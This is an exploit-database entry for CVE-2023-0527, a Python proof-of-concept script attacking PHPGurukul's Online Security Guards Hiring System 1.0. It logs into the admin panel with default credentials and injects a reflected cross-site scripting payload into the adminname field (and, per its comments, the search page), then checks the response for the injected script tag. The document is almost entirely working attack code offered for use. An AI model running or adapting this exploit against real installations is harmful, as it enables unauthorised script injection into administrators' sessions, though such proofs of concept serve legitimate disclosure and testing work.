@@ -1,0 +1,100 @@
+id: 38745
+date: 05/31/2023
+title: Online Security Guards Hiring System 1.0 - Reflected XSS Exploit
+author: AFFAN AHMED
+cves: CVE-2023-0527
+
+#Exploit Title: Online Security Guards Hiring System 1.0 – REFLECTED XSS 
+#Exploit Author : AFFAN AHMED
+#Vendor Homepage: https://phpgurukul.com
+#Software Link: https://phpgurukul.com/projects/Online-Security-Guard-Hiring-System_PHP.zip
+#Version: 1.0
+#Tested on: Windows 11 + XAMPP + PYTHON-3.X
+#CVE : CVE-2023-0527
+
+#NOTE: TO RUN THE PROGRAM FIRST SETUP THE CODE WITH XAMPP AND THEN RUN THE BELOW PYTHON CODE TO EXPLOIT IT
+# Below code check for both the parameter /admin-profile.php and in /search.php
+
+#POC-LINK: https://github.com/ctflearner/Vulnerability/blob/main/Online-Security-guard-POC.md
+
+
+import requests 
+import re 
+from colorama import Fore
+
+print(Fore.YELLOW + "######################################################################" + Fore.RESET)
+print(Fore.RED + "# TITLE: Online Security Guards Hiring System v1.0" + Fore.RESET)
+print(Fore.RED + "# VULNERABILITY-TYPE : CROSS-SITE SCRIPTING (XSS)" + Fore.RESET)
+print(Fore.RED + "# VENDOR OF THE PRODUCT : PHPGURUKUL" + Fore.RESET)
+print(Fore.RED + "# AUTHOR : AFFAN AHMED" + Fore.RESET)
+print(Fore.YELLOW +"######################################################################" + Fore.RESET)
+
+print()
+print(Fore.RED+"NOTE: To RUN THE CODE JUST TYPE : python3 exploit.py"+ Fore.RESET)
+print()
+
+
+# NAVIGATING TO ADMIN LOGIN PAGE
+Website_url = "http://localhost/osghs/admin/login.php"    # CHANGE THE URL ACCORDING TO YOUR SETUP
+print(Fore.RED+"----------------------------------------------------------------------"+ Fore.RESET)
+print(Fore.CYAN + "[**] Inserting the Username and Password in the Admin Login Form [**]" + Fore.RESET)
+print(Fore.RED+"----------------------------------------------------------------------"+Fore.RESET)
+
+Admin_login_credentials = {'username': 'admin', 'password': 'Test@123', 'login': ''}
+
+headers = {
+    'Content-Type': 'application/x-www-form-urlencoded',
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36',
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+    'Referer': 'http://localhost/osghs/admin/login.php',
+    'Accept-Encoding': 'gzip, deflate',
+    'Accept-Language': 'en-US,en;q=0.9',
+    'Connection': 'close',
+    'Cookie': 'PHPSESSID=8alf0rbfjmhm3ddra7si0cv7qc',
+    'Sec-Fetch-Site': 'same-origin',
+    'Sec-Fetch-Mode': 'navigate',
+    'Sec-Fetch-User': '?1',
+    'Sec-Fetch-Dest': 'document'
+}
+
+response = requests.request("POST", Website_url, headers=headers, data = Admin_login_credentials)
+if response.status_code == 200:
+    location = re.findall(r'document.location =\'(.*?)\'',response.text)
+    if location:
+        print(Fore.GREEN + "> Login Successful into Admin Account"+Fore.RESET)
+        print(Fore.GREEN + "> Popup:"+ Fore.RESET,location )
+    else:
+        print(Fore.GREEN + "> document.location not found"+ Fore.RESET)
+else:
+    print(Fore.GREEN + "> Error:", response.status_code + Fore.RESET)
+print(Fore.RED+"----------------------------------------------------------------------"+ Fore.RESET)
+print(Fore.CYAN + " [**] Trying XSS-PAYLOAD in Admin-Name Parameter  [**]" + Fore.RESET)
+
+
+# NAVIGATING TO ADMIN PROFILE SECTION  TO UPDATE ADMIN PROFILE 
+# INSTEAD OF /ADMIN-PROFILE.PHP REPLACE WITH /search.php TO FIND XSS IN SEARCH PARAMETER
+Website_url= "http://localhost/osghs/admin/admin-profile.php"   # CHANGE THIS URL ACCORDING TO YOUR PREFERENCE
+
+# FOR CHECKING XSS IN ADMIN-PROFILE USE THE BELOW PAYLOAD
+# FOR CHECKING XSS IN SEARCH.PHP SECTION REPLACE EVERYTHING AND PUT searchdata=<your-xss-payload>&search=""
+payload = {
+    "adminname": "TESTAdmin<script>alert(\"From-Admin-Name\")</script>",      # XSS-Payload , CHANGE THIS ACCORDING TO YOUR PREFERENCE
+    "username": "admin",                                                      # THESE DETAILS ARE RANDOM , CHANGE IT TO YOUR PREFERENCE
+    "mobilenumber": "8979555558",
+    "email": "admin@gmail.com",
+    "submit": "",
+}
+
+# SENDING THE RESPONSE WITH POST REQUEST
+response = requests.post(Website_url, headers=headers, data=payload)
+
+print(Fore.RED+"----------------------------------------------------------------------"+ Fore.RESET)
+# CHECKING THE STATUS CODE 200 AND ALSO FINDING THE SCRIPT TAG WITH THE HELP OF REGEX 
+if response.status_code == 200:
+    scripts = re.findall(r'<script>alert\(.*?\)</script>', response.text)
+    print(Fore.GREEN + "> Response After Executing the Payload at adminname parameter : "+ Fore.RESET) 
+    print(Fore.GREEN+">"+Fore.RESET,scripts)
+exploit.py
+Displaying exploit.py.
+
+#  0day.today [2023-06-08]  #
